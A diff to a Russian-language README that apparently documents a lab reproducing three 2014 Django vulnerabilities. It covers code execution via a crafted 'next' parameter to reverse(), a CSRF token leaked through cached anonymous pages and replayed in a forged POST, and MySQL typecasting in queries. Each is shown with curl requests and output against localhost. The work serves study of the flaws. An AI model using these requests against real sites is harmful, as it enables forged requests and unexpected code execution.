@@ -4,10 +4,14 @@ https://www.djangoproject.com/weblog/2014/apr/21/security/
 
 ```
 $ pip install Django==1.6.2 MySQL-python==1.2.5
-$ django-admin.py startproject vulnerable
+$ django-admin.py startproject django-vulnerable
 ```
 
 ## Issue: Unexpected code execution using reverse() ##
+
+
+Обычный HTTP запрос
+
 
 	$ curl localhost:8000
 
@@ -23,6 +27,9 @@ $ django-admin.py startproject vulnerable
 	        \__/  /(_E     \__/
 	          (  /
 	           MM
+
+
+HTTP запрос злоумышленника
 
 
 	$ curl localhost:8000?next=pwn.own
@@ -59,6 +66,10 @@ $ django-admin.py startproject vulnerable
 	           $.d$$$*                           *  J$$$e*
 	            """""                              "$$$"
 
+
+В этом случае происходим импорт модуля `pwn` с выполнением `import side effect`
+
+
 ## Issue: Caching of anonymous pages could reveal CSRF token ##
 
 ### Анатомия уязвимости
@@ -80,25 +91,27 @@ $ django-admin.py startproject vulnerable
 0. Пример кода с view
 
 1. Представим ситуацию. Жертва - постоянный анонимный пользователь сайта.
-```
-$ curl localhost:8000/boom/
-7Z7YC0t8KhN0wU0wN97I5LN6zrhLFFNc
-```
+
+  ```
+  $ curl localhost:8000/boom/
+  7Z7YC0t8KhN0wU0wN97I5LN6zrhLFFNc
+  ```
 
 2. У злоумышленника есть сайт и механизм(бот), который ходит на сайт жертвы и получает куки анонимов из кэша
 
 3. (прил) пользователь заходит на сайт злоумышленника и там выполняется AJAX запрос аналогичный
-```
-$ curl --request POST \
+  ```
+  $ curl --request POST \
 	--cookie "csrftoken=7Z7YC0t8KhN0wU0wN97I5LN6zrhLFFNc" \
 	--data "csrfmiddlewaretoken=7Z7YC0t8KhN0wU0wN97I5LN6zrhLFFNc" \
 	localhost:8000/boom/
-BOOM!
-```
+  BOOM!
+  ```
 
 ## Issue: MySQL typecasting
 
 Попытаемся разобраться о чем идет речь
+
 
 	>>> query_obj = CVE_2014_0474_Blacklist.objects.filter(ip=192)
 	>>> print query_obj.query
@@ -113,9 +126,13 @@ BOOM!
 	+----+---------------+
 	2 rows in set, 3 warnings (0,01 sec)
 
+
 Варианты использования:
-У злоумышленника появился доступ к очереди celery.
+
+У злоумышленника появился доступ к очереди(например RabbitMQ) celery.
+
 Celery сериализует аргументы функций. Можно сериализовать число туда, где приложение ожидает строку.
+
 
 	>>> query_obj.delete()
 	Traceback (most recent call last):
@@ -151,3 +168,8 @@ Celery сериализует аргументы функций. Можно се
 	| Warning | 1292 | Truncated incorrect DOUBLE value: '192.168.83.17                                ' |
 	+---------+------+-----------------------------------------------------------------------------------+
 	3 rows in set (0,00 sec)
+
+
+На этом я решил остановиться. Эксплуатировать уязвимость не получилось.
+
+Заинтересованным можно попробовать продолжить разные комбинации MySQL и Python коннектора для успешной выполнения атаки.
